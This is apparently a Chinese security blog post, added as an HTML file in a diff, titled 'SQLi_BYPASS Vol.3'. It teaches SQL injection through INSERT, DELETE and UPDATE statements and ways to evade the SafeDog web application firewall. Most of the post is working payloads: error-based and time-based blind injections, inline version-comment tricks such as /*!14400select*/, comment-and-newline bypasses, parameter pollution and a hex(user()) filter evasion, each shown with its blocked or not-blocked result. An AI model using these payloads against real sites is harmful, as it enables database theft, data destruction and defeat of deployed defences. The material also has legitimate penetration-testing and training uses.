@@ -1,0 +1,156 @@
+<!DOCTYPE html><html lang="zh-cn"><head><meta name="generator" content="Hexo 3.9.0"><meta charset="utf-8"><meta http-equiv="X-UA-Compatible" content="IE=Edge"><meta name="viewport" content="width=device-width,initial-scale=1.0,minimum-scale=1.0,maximum-scale=1.0,user-scalable=no"><meta name="format-detection" content="telephone=no"><meta name="format-detection" content="email=no"><meta name="description"><meta name="keywords" content="Hexo, Gruntjs, Nodejs, Reactjs, Vuejs"><title>💉 SQLi_BYPASS Vol.3 - Naykcin's Page</title><link rel="stylesheet" href="/css/main_style.min.css"><link rel="icon" href="/logo.png"></head><body><input id="navi" type="checkbox"><ul class="main-navication"><li><a href="/"><span>Home</span></a></li><li><a href="https://github.com"><span>Github</span></a></li><li><a href="https://www.v2ex.com/"><span>V2EX</span></a></li></ul><div class="wrapper" id="wrap"><div class="post-header"><label class="navi-button light" for="navi">MENU</label><img class="background" src="http://47.95.140.43/typora_pic/background.JPG"><div class="post-title"><h1 class="title">💉 SQLi_BYPASS Vol.3</h1><ul class="meta"><li><i class="icon icon-author"></i>Naykcin</li><li><i class="icon icon-clock"></i>26 Minutes</li><li><i class="icon icon-calendar"></i>January 8, 2020</li></ul></div></div><div class="article-content" style="max-width:800px"><h2 id="💉-SQLi-BYPASS-Vol-3"><a href="#💉-SQLi-BYPASS-Vol-3" class="headerlink" title="💉 SQLi_BYPASS Vol.3"></a><center>💉 SQLi_BYPASS Vol.3</center></h2><h3 id="目录"><a href="#目录" class="headerlink" title="目录"></a>目录</h3><ul>
+<li>insert、delete、update</li>
+<li>联合注入 BYPASS</li>
+<li>注入 BYPASS</li>
+</ul>
+<h3 id="🎙️-0x00-前言"><a href="#🎙️-0x00-前言" class="headerlink" title="🎙️ 0x00 前言"></a>🎙️ 0x00 前言</h3><p>接着 vol.2 继续。</p>
+<h3 id="0x19-insert、delete、update-注入"><a href="#0x19-insert、delete、update-注入" class="headerlink" title="0x19 insert、delete、update 注入"></a>0x19 insert、delete、update 注入</h3><p>insert、delete、update 主要用在盲注和报错注入，这类注入点不建议使用 sqlmap 等工具，可能会造成大量的垃圾数据。</p>
+<h4 id="insert-注入"><a href="#insert-注入" class="headerlink" title="insert 注入"></a>insert 注入</h4><p>insert 注入一般会出现在注册、IP 头、留言板等等需要写入数据的地方，同时这种注入不报错一般较难发现。</p>
+<h5 id="报错"><a href="#报错" class="headerlink" title="报错"></a>报错</h5><p><code>insert into admin (id,username,password) values (2,&quot;or updatexml(1,concat(0x7e,(version())),0) or&quot;,&quot;admin&quot;);</code></p>
+<p>针对这个 payload 可以发现，如果没有闭合可能会产生很多垃圾数据：</p>
+<p><img src="http://47.95.140.43/tu/sqli_bypass3/Screenshot%202020-02-19%20%E4%B8%8B%E5%8D%884.23.56.jpg" alt="Screenshot 2020-02-19 下午4.23.56"></p>
+<p>闭合之后，根据报错可以爆出信息：</p>
+<p><code>insert into admin (id,username,password) values (3,&quot;&quot;or updatexml(1,concat(0x7e,(version())),0) or&quot;&quot;,&quot;sdfsdf&quot;);</code></p>
+<p><img src="http://47.95.140.43/tu/sqli_bypass3/Screenshot%202020-02-19%20%E4%B8%8B%E5%8D%884.30.36.jpg" alt="Screenshot 2020-02-19 下午4.30.36"></p>
+<h5 id="盲注"><a href="#盲注" class="headerlink" title="盲注"></a>盲注</h5><p>int 型可以使用运算符，如 +-*/ and or 异或 移位等等。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">// 如果用户名首字母是r，就睡五秒。（用户名为root）</span><br><span class="line">mysql&gt; insert into admin values (2+if((substr((select user()),1,1)=&apos;r&apos;),sleep(5),1),&apos;slim&apos;,&quot;sdfsdf&quot;);</span><br><span class="line"></span><br><span class="line">// 如果用户名首字母是s，就睡五秒。（用户名为root）</span><br><span class="line">insert into admin values (2+if((substr((select user()),1,1)=&apos;s&apos;),sleep(5),1),&apos;slim&apos;,&quot;sdfsdf&quot;);</span><br></pre></td></tr></table></figure>
+
+<p><img src="http://47.95.140.43/tu/sqli_bypass3/Screenshot%202020-02-19%20%E4%B8%8B%E5%8D%884.38.21.jpg" alt="Screenshot 2020-02-19 下午4.38.21"></p>
+<p>字符型注意闭合，不能使用 and。</p>
+<p><img src="http://47.95.140.43/tu/sqli_bypass3/Screenshot%202020-02-19%20%E4%B8%8B%E5%8D%884.48.26.jpg" alt="Screenshot 2020-02-19 下午4.48.26"></p>
+<p>这种方式会产生大量的垃圾数据，这里需要注意。</p>
+<h4 id="delete-注入"><a href="#delete-注入" class="headerlink" title="delete 注入"></a>delete 注入</h4><h5 id="报错-1"><a href="#报错-1" class="headerlink" title="报错"></a>报错</h5><p>使用 delete 注入非常危险，语句不当可能会造成很严重的后果。<code>or 1=1</code> 因为 1=1 为 true 所以每一行都被删除了。</p>
+<p>所以在使用 delete 型注入的时候使用 or 一定要为 false。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; delete from admin where id=-2 or updatexml(1,concat(0x7e,(version())),0);</span><br></pre></td></tr></table></figure>
+
+<p><img src="http://47.95.140.43/tu/sqli_bypass3/Screenshot%202020-02-19%20%E4%B8%8B%E5%8D%884.59.30.jpg" alt="Screenshot 2020-02-19 下午4.59.30"></p>
+<h5 id="盲注-1"><a href="#盲注-1" class="headerlink" title="盲注"></a>盲注</h5><p><code>if()</code> 函数一定要注意，如果 expr1 的值为 true，则返回 expr2 的值，否则返回 expr3 的值。</p>
+<p>所以 delete 注入时，or 右边一定要为 false。</p>
+<p>⚠️ 但是在 delete 注入实测中发现，例如 payload 为 <code>delete from admin where id=-2 or sleep(3);</code>，理论上会睡眠 3 秒返回，但是实际测试中睡了 36 秒，怀疑是将整个表所有行都跑了一遍（一共 12 行）。所以这里引申出另一个问题，真实渗透测试中目标的数据库可能有几万行数据，等待几万秒可能会造成 DDOS 攻击。这里记录一下有待考证，但是根据时间的返回确实是可以判断出结果的。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; delete from admin where id=-2 or if((substr((select user()),1,4)=&apos;root&apos;),sleep(1),0);</span><br><span class="line"></span><br><span class="line">mysql&gt; delete from admin where id=-2 or if((substr((select user()),1,4)=&apos;toor&apos;),sleep(1),0);</span><br></pre></td></tr></table></figure>
+
+<p><img src="http://47.95.140.43/tu/sqli_bypass3/Screenshot%202020-02-19%20%E4%B8%8B%E5%8D%885.30.36.jpg" alt="Screenshot 2020-02-19 下午5.30.36"></p>
+<h4 id="update-注入"><a href="#update-注入" class="headerlink" title="update 注入"></a>update 注入</h4><p>与以上类似。但是<strong>要注意 update 会修改数据</strong>。</p>
+<h5 id="报错-2"><a href="#报错-2" class="headerlink" title="报错"></a>报错</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">// 要注意不能既更新该表又查该表</span><br><span class="line">mysql&gt; update admin set id=&quot;2&quot;+updatexml(1,concat(0x7e,(version())),0)+&quot;&quot; where id=5;</span><br><span class="line"></span><br><span class="line">mysql&gt; update admin set id=&quot;2&quot;+updatexml(1,concat(0x7e,(select schema_name from information_schema.schemata limit 0,1)),0)+&quot;&quot; where id=2;</span><br></pre></td></tr></table></figure>
+
+<p><img src="http://47.95.140.43/tu/sqli_bypass3/Screenshot%202020-02-19%20%E4%B8%8B%E5%8D%886.05.05.jpg" alt="Screenshot 2020-02-19 下午6.05.05"></p>
+<h5 id="盲注-2"><a href="#盲注-2" class="headerlink" title="盲注"></a>盲注</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">// 如果用户名是root，就睡三秒，然后修改id为1的那一行</span><br><span class="line">mysql&gt; update admin set id=&quot;2&quot;+if((substr((select user()),1,4)=&apos;root&apos;),sleep(3),0)+&quot;&quot; where id=1;</span><br><span class="line"></span><br><span class="line">// 如果用户名是toor，就睡三秒.</span><br><span class="line">mysql&gt; update admin set id=&quot;3&quot;+if()+&quot;&quot; where id=2;</span><br></pre></td></tr></table></figure>
+
+<p><img src="http://47.95.140.43/tu/sqli_bypass3/Screenshot%202020-02-19%20%E4%B8%8B%E5%8D%885.52.26.jpg" alt="Screenshot 2020-02-19 下午5.52.26"></p>
+<h4 id="🚨-BYPASS"><a href="#🚨-BYPASS" class="headerlink" title="🚨 BYPASS"></a>🚨 BYPASS</h4><p>在找 update、insert 注入时，可以尝试插入引号、双引号、转义符让语句不能正常执行，如果插入失败，更新失败，就可以深入测试确定是否存在注入。</p>
+<h3 id="0x20-联合注入-BYPASS"><a href="#0x20-联合注入-BYPASS" class="headerlink" title="0x20 联合注入 BYPASS"></a>0x20 联合注入 BYPASS</h3><p>通用型的 waf，需要考虑到用户体验，不能出现什么东西就直接拦截。所以如何成功绕过需要我们具备对 mysql 各个函数、语法、特性的熟悉，然后通过不断地 fuzz 来测试出 payload。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">测试环境</span><br><span class="line"></span><br><span class="line">windows server 2008 + apache2.4 + safedog V3.0-20140109</span><br></pre></td></tr></table></figure>
+
+<p>每个安全狗的版本不同，过滤的正则也是不同的。所以有的 payload 在最新版可以用，但可能老版本就用不了，所以这是需要知识储备的，最重要的还是多看手册。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">位运算符：</span><br><span class="line">位运算符是在二进制上进行计算的运算符，位运算符会先将操作数变成二进制数，进行位运算。然后再将计算结果从二进制数变回十进制数。</span><br><span class="line"></span><br><span class="line">&amp; 按位与 两者都</span><br><span class="line">// 对应位都为1则结果为1，否则为0</span><br><span class="line"></span><br><span class="line">| 按位或 两者或</span><br><span class="line">// 对应位有一个或两个为1则结果为1，否则为0</span><br><span class="line"></span><br><span class="line">^ 按位异或 相同为0，不同为1</span><br><span class="line">// 对应位不相同时，结果为1，否则为0</span><br><span class="line"></span><br><span class="line">&lt;&lt; 按位左移</span><br><span class="line">// select 1&lt;&lt;2;</span><br><span class="line">0001 左移两位，剩下的用0补齐，变成 0100</span><br><span class="line"></span><br><span class="line">&gt;&gt; 按位右移</span><br><span class="line">// 同上</span><br><span class="line"></span><br><span class="line">! 按位取反</span><br><span class="line">涉及到补码、原码等，还有 ~ 符号好像也是取反的，有点复杂，以后回来再看 😅</span><br><span class="line"></span><br><span class="line">8421</span><br><span class="line">1&amp;5			1&amp;6			2&amp;5			2&amp;7			15&amp;15		5&amp;15</span><br><span class="line">0001		0001		0010		0010		1111		0101</span><br><span class="line">0101		0110		0101		0111		1111		1111</span><br><span class="line">0001		0000		0000		0010		1111		0101</span><br></pre></td></tr></table></figure>
+
+<p><strong>运算符优先级</strong></p>
+<p>最低优先级是 <code>:=</code>。</p>
+<p><img src="http://47.95.140.43/tu/sqli_bypass3/1011652-20170416163043227-1936139924.png" alt="1011652-20170416163043227-1936139924"></p>
+<p>最高优先级是 <code>!</code>、<code>BINARY</code>、<code>COLLATE</code>。</p>
+<h4 id="从-and-开始"><a href="#从-and-开始" class="headerlink" title="从 and 开始"></a>从 and 开始</h4><p>搭好环境之后，开始测试，我们从最开始的试错开始。</p>
+<ol>
+<li><p>输入 <code>&#39;</code> 报错，说明可能存在注入。</p>
+</li>
+<li><p>开始测试简单的语句：<code>and 1=1</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">?id=1&apos; and 1				拦截</span><br><span class="line">?id=1&apos; and &apos;1&apos;			拦截</span><br><span class="line">?id=1&apos; and a				不拦截</span><br><span class="line">?id=1&apos; and &apos;a&apos;			拦截</span><br><span class="line">?id=1&apos; and !				不拦截</span><br><span class="line">?id=1&apos; and 1+1			拦截</span><br><span class="line">?id=1&apos; and 1+a			拦截</span><br><span class="line">?id=1&apos; and hex(1)	不拦截</span><br></pre></td></tr></table></figure>
+
+<p>分析一下：当 and 后面跟上数字型和字符型时，安全狗会拦截。在安全狗的规则库里我们可以看到它拦截 and 和 or，所以有两个思路：</p>
+<ul>
+<li>用其他的字符替换 and 或 or。</li>
+<li>不带入字符串或数字型，带入一个特殊符号。</li>
+</ul>
+<p>第一种思路可以带入运算符号来绕过，通过运算符来改变 ID 的值，然后根据页面是否变化来做判断。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">?id=1&apos; |2 -- +</span><br><span class="line">// 结果应该是3，测试有效</span><br><span class="line"></span><br><span class="line">?id=1&apos; &amp;3 -- +</span><br><span class="line">// 结果应该是1，但是这里报错了，不知道为啥</span><br><span class="line"></span><br><span class="line">?id=1&apos; ^4 -- +</span><br><span class="line">// 结果应该是5，测试有效</span><br></pre></td></tr></table></figure>
+
+<p><img src="http://47.95.140.43/tu/sqli_bypass3/Screenshot%202020-02-22%20%E4%B8%8B%E5%8D%885.35.32.jpg" alt="Screenshot 2020-02-22 下午5.35.32"></p>
+<p><img src="http://47.95.140.43/tu/sqli_bypass3/Screenshot%202020-02-22%20%E4%B8%8B%E5%8D%885.39.38.jpg" alt="Screenshot 2020-02-22 下午5.39.38"></p>
+<p>接着另一种思路，正面刚 and 或 or 是否可行呢？之前测试过 <code>hex(1)</code> 是不会拦截的，这里其实可以作为判断依据了，我们再深入研究一下。</p>
+<p>⚠️ <strong>注意</strong></p>
+<p>这里需要注意的一点是，payload <code>?id=1 and hex(0)</code> 和 <code>?id=1&#39; and hex(0)</code> 是不同的。</p>
+<p>我们一开始根据报错猜测系统的 sql 语句是：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from xxx where id=&apos;$id&apos; limit 0,1;</span><br></pre></td></tr></table></figure>
+
+<p>所以这个单引号的位置就很重要，如果不带单引号的话，payload 为 <code>?id=1 and hex(0)</code>，提交语句执行就变成了：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from xxx where id=&apos;1 and hex(0)&apos; limit 0,1;</span><br></pre></td></tr></table></figure>
+
+<p>在 mysql 中执行的结果是：</p>
+<p><img src="http://47.95.140.43/tu/sqli_bypass3/Screenshot%202020-02-22%20%E4%B8%8B%E5%8D%885.54.55.jpg" alt="Screenshot 2020-02-22 下午5.54.55"></p>
+<p>与我们期望的 <code>and 1=0</code> 无匹配结果并不相同，所以需要在引号上面做手脚，将 payload 修改为 <code>?id=1&#39; and hex(0) -- +</code> 即可：</p>
+<p><img src="http://47.95.140.43/tu/sqli_bypass3/Screenshot%202020-02-22%20%E4%B8%8B%E5%8D%885.57.19.jpg" alt="Screenshot 2020-02-22 下午5.57.19"></p>
+<p><img src="http://47.95.140.43/tu/sqli_bypass3/Screenshot%202020-02-22%20%E4%B8%8B%E5%8D%885.58.14.jpg" alt="Screenshot 2020-02-22 下午5.58.14"></p>
+<p>然后接着刚才 <code>hex()</code> 的思路，测试：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?id=1&apos; and &apos;hex(0)				不拦截</span><br><span class="line">?id=1&apos; and &apos;hex(0)=1			拦截</span><br><span class="line">?id=1&apos; and &apos;hex(0)=&apos;a&apos;		拦截</span><br></pre></td></tr></table></figure>
+
+<p>可以发现 <code>hex(0)=</code> 后面跟字符型或数字型还是会拦截，我们猜测安全狗会判断 <code>=</code> 左右的字符类型，接着测试一下别的符号：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">?id=1&apos; and &apos;~1&gt;1				不拦截</span><br><span class="line">?id=1&apos; and &apos;hex(1)&gt;1		拦截</span><br><span class="line">?id=1&apos; and &apos;hex(1)&gt;-1		不拦截</span><br><span class="line">?id=1&apos; and &apos;hex(1)&gt;~1		不拦截</span><br></pre></td></tr></table></figure>
+
+<p>可以发现安全狗只拦截数字型的正数而不拦截负数，payload <code>?id=1&#39; and -2&gt;1</code> 就可以绕过,可能是负号绕过了它的正则。</p>
+<p><img src="http://47.95.140.43/tu/sqli_bypass3/Screenshot%202020-02-22%20%E4%B8%8B%E5%8D%886.08.56.jpg" alt="Screenshot 2020-02-22 下午6.08.56"></p>
+</li>
+</ol>
+<h4 id="接着-union-select-联合查询"><a href="#接着-union-select-联合查询" class="headerlink" title="接着 union select 联合查询"></a>接着 union select 联合查询</h4><h5 id="内联注释绕过"><a href="#内联注释绕过" class="headerlink" title="内联注释绕过"></a><strong>内联注释绕过</strong></h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">// 测试是否过滤字符串、函数</span><br><span class="line">?id=union										不拦截</span><br><span class="line">?id=select									不拦截</span><br><span class="line">?id=union select						拦截</span><br><span class="line">?id=union/**/select 				拦截</span><br><span class="line">?id=union/*select*/					不拦截</span><br><span class="line">?id=union 各种字符 select			有时拦有时不拦</span><br></pre></td></tr></table></figure>
+
+<p>可以发现安全狗是识别注释符号的，我们可以利用注释符号来尝试绕过。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">内联注释 /*!/*!*/</span><br><span class="line"></span><br><span class="line">http://1.1.1.1/less-1/?id=1&apos; union /*!/*!50000select*/ 1,2,3 -- +				拦截</span><br><span class="line"></span><br><span class="line">http://1.1.1.1/less-1/?id=1&apos; union/*!/*!5select*/ 1,2,3 -- + 	不拦截，但是报错了</span><br></pre></td></tr></table></figure>
+
+<p>为什么不拦截呢？这里是因为 50000 是版本号，多一位或少一位都是不能执行的，所以安全狗就放行了。</p>
+<p>🔩 <strong>拓展</strong></p>
+<p>内联注释 <code>/*!/*!*/</code></p>
+<p>当 <code>!</code> 后面跟的是数据库版本号时，如果实际的版本号高于或者等于该字符串，应用程序就会将注释内容解释为 sql 语句，否则就会当作注释来处理。默认的，如果没有接版本号，也是会执行里面的内容的。</p>
+<p>那么如果我们用 burp 遍历这个值呢？从 10000 开始，我们把 <code>0000</code> 设置为变量，intruder 爆破，可以得到：</p>
+<p><img src="http://47.95.140.43/tu/sqli_bypass3/Screenshot%202020-02-22%20%E4%B8%8B%E5%8D%886.51.32.jpg" alt="Screenshot 2020-02-22 下午6.51.32"></p>
+<p>得到 <code>14400</code>，所以我们可以编写 payload 为：</p>
+<p>（但是在实际测试中，<code>14400</code>、<code>11440</code>、<code>11441</code> 都可以绕过，但是在 burp 中的返回包中显示被拦截。）</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://1.1.1.1/?id=-1&apos; union/*!/*!14400select*/ 1,2,3 -- +</span><br></pre></td></tr></table></figure>
+
+<p><img src="http://47.95.140.43/tu/sqli_bypass3/Screenshot%202020-02-22%20%E4%B8%8B%E5%8D%887.16.10.jpg" alt="Screenshot 2020-02-22 下午7.16.10"></p>
+<center>成功绕过且执行</center>
+
+<p>再尝试一下其他的 payload：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">// 以下的 payload 都可以成功绕过且执行</span><br><span class="line">http://1.1.1.1/?id=-1&apos; union/*!/*!14400select*/ 1,2,3 -- +</span><br><span class="line"></span><br><span class="line">http://1.1.1.1/?id=-1&apos; union/*!14400/*!14400select*/ 1,2,3 -- +</span><br><span class="line"></span><br><span class="line">http://1.1.1.1/?id=-1&apos; union/*!14400select*/ 1,2,3 -- +</span><br><span class="line"></span><br><span class="line">http://1.1.1.1/?id=-1&apos; union/*!14400/**/%0aselect*/ 1,2,3 -- +</span><br></pre></td></tr></table></figure>
+
+<p>所以说内联 bypass 的核心就在于版本号，通过不断的 fuzz，万变不离其宗。</p>
+<h5 id="注释绕过"><a href="#注释绕过" class="headerlink" title="# 注释绕过"></a><strong># 注释绕过</strong></h5><p>还有其他的注释 <code>--空格</code>、<code>#</code>，以前有大神发布过 payload：<code>union%23%0aselect</code>，因为这些都是单行注释，而 <code>%oa</code> 是换行符，但是该 payload 已经被加入规则库了。这里也是一个 fuzz 的过程。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">// 这里写一下思路</span><br><span class="line"></span><br><span class="line">union %23%0aselect 				拦截，接着测试是哪部分被拦截</span><br><span class="line">union %23select						拦截</span><br><span class="line">union a%23select					不拦截，从这里入手</span><br><span class="line">union all%23 select 			不拦截</span><br><span class="line">union all%23%0a select		不拦截</span><br><span class="line">union %23%0aall select		不拦截</span><br></pre></td></tr></table></figure>
+
+<p>所以 payload 可以写成 <code>http://1.1.1.1/?id=1&#39; union%23%0aall select</code>。</p>
+<p><img src="http://47.95.140.43/tu/sqli_bypass3/Screenshot%202020-02-22%20%E4%B8%8B%E5%8D%887.47.20.jpg" alt="Screenshot 2020-02-22 下午7.47.20"></p>
+<p>有时候 fuzz 右边不行，也可以试试左边。为什么可以加 all，这个时候就必须要多查手册，union all 命令和 union 命令几乎是等效的，不过 union all 命令会列出所有的值。</p>
+<h5 id="–空格-注释绕过"><a href="#–空格-注释绕过" class="headerlink" title="–空格 注释绕过"></a><strong>–空格 注释绕过</strong></h5><p>最初的姿势其实差不多：<code>-- %0a</code>，这个 payload 也已经被加入了规则库。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">union all -- %0a select			拦截</span><br><span class="line">union -- %0a select					拦截</span><br><span class="line">union -- +%0a select				拦截</span><br><span class="line">union -- a%0a select 				不拦截</span><br><span class="line">union -- 1%0a select 				不拦截</span><br><span class="line">union -- hex(2)%0a select   不拦截</span><br></pre></td></tr></table></figure>
+
+<p>发挥想象力、多看手册。</p>
+<h5 id="hpp-参数污染"><a href="#hpp-参数污染" class="headerlink" title="hpp 参数污染"></a><strong>hpp 参数污染</strong></h5><p>hpp 参数污染的原因主要是 web server 对参数的解析问题。PHP/Apache 中，它总先解析最后一个 id。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://1.1.1.1/?id=-1&apos; /*&amp;id=&apos;union select 1,user(),3 -- +*/</span><br></pre></td></tr></table></figure>
+
+<p><img src="http://47.95.140.43/tu/sqli_bypass3/Screenshot%202020-02-22%20%E4%B8%8B%E5%8D%888.11.25.jpg" alt="Screenshot 2020-02-22 下午8.11.25"></p>
+<h3 id="0x21-注入-BYPASS"><a href="#0x21-注入-BYPASS" class="headerlink" title="0x21 注入 BYPASS"></a>0x21 注入 BYPASS</h3><p>（判断列数时，payload 也可以使用内联注入部分：<code>?id=1&#39; order /*!/*!14400by/ 4 -- +</code>，判断出列数之后使用 union select 联合查询。）</p>
+<p>绕过 union select 之后，接着进行接下来的注入。<code>user()</code> 查询用户，但是这个函数被禁了：</p>
+<p><img src="http://47.95.140.43/tu/sqli_bypass3/Screenshot%202020-02-22%20%E4%B8%8B%E5%8D%888.19.07.jpg" alt="Screenshot 2020-02-22 下午8.19.07"></p>
+<p>我们来尝试绕过，继续 fuzz。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">user()						拦截</span><br><span class="line">user/**/()				拦截</span><br><span class="line">user/**/(/**/)		拦截</span><br><span class="line">hex(user())				拦截</span><br><span class="line">hex(user/**/(/**/))	不拦截</span><br><span class="line">hex(user/**/())		不拦截</span><br></pre></td></tr></table></figure>
+
+<p><img src="http://47.95.140.43/tu/sqli_bypass3/Screenshot%202020-02-22%20%E4%B8%8B%E5%8D%888.24.20.jpg" alt="Screenshot 2020-02-22 下午8.24.20"></p>
+<p>十六进制解码得到：<code>root@localhost</code></p>
+<p>接着就可以尝试猜解库名，构造 payload：</p>
+<p><code>?id=-1&#39; union /!*11440select*/ 1,schema_name,3 from information_schema.schemata limit 2,1 -- +</code></p>
+<p><img src="http://47.95.140.43/tu/sqli_bypass3/Screenshot%202020-02-22%20%E4%B8%8B%E5%8D%888.33.55.jpg" alt="Screenshot 2020-02-22 下午8.33.55"></p>
+<p>当然在真实环境中，<code>information_schema</code> 可能会被过滤，所以这里记录一些绕过的思路：</p>
+<p>继续 fuzz 尝试：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&apos; union /!*11440select*/ 1,select schema_name from `information_schema`.schemata,3 limit 2,1 -- +</span><br><span class="line"></span><br><span class="line">`information_schema`.`schemata`</span><br><span class="line"></span><br><span class="line">information.`schemata`</span><br><span class="line">(information_schema.schemata)</span><br><span class="line">information_schema/**/.schemata</span><br></pre></td></tr></table></figure>
+
+<p>你有认真地看过、测试过这些吗？</p>
+</div><div class="article-meta" style="max-width:800px"></div><div class="article-comment" style="max-width:800px"><div class="ds-thread" id="ds-thread" data-thread-key="ck70hs23d000m6mozqmcrspz1" data-title="💉 SQLi_BYPASS Vol.3" data-url="http://www.naykcin.top/2020/01/08/sqlibypass3/" site-name="ueibo"></div><script>var siteName = document.getElementById('ds-thread').getAttribute('site-name');
+var duoshuoQuery = {short_name: siteName};
+(function() {
+  var ds = document.createElement('script');
+  ds.type = 'text/javascript';ds.async = true;
+  ds.src = (document.location.protocol == 'https:' ? 'https:' : 'http:') + '//static.duoshuo.com/embed.js';
+  ds.charset = 'UTF-8';
+  (document.getElementsByTagName('head')[0] 
+  || document.getElementsByTagName('body')[0]).appendChild(ds);
+})();</script></div><ul class="navication"><li class="home"><a href="/"><i class="icon icon-home"></i></a></li><li><a href="/2020/01/12/MS14-068/"><i class="icon icon-arror-left"></i></a></li><li><a href="/2020/01/07/sqlibypass2/"><i class="icon icon-arror-right"></i></a></li></ul><div class="page-footer"><div class="top"><ul class="social"><li><a href="https://github.com/NickYan7" title="Github" target="_blank"><i class="icon icon-github"></i></a></li><li><a href="http://47.95.140.43/tu/721580653348_.pic.jpg" title="wechat" target="_blank"><i class="icon icon-wechat"></i></a></li></ul></div><div class="bottom"><p class="copyright">© 2020 Naykcin's Page</p></div></div></div><script>var wrap = document.getElementById('wrap');
+window.onload = function () {
+  wrap.className += ' done';
+}</script></body></html>
